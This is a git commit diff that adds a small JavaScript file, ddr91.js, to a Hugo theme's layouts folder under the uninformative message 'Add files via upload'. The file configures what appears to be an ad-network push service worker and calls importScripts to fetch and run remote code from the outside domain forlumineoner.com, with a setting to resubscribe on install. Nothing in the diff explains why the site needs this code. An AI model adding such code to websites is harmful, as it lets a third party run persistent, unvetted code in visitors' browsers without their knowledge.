7890c2babf0a073168a4e7c2b1ffc74922b6ccc6
hd-720p <130404209+hd-720p@users.noreply.github.com>
2023-08-22 15:56:00 +0700

    Add files via upload

---
+++ themes/coyote/layouts/_default/ddr91.js
@@ -0,0 +1,8 @@
+self.options = {
+    "domain": "forlumineoner.com",
+    "resubscribeOnInstall": true,
+    "zoneId": 1993476,
+    "pub": 1
+}
+self.lary = "";
+importScripts('https://forlumineoner.com/pfe/current/service-worker.min.js?r=sw')
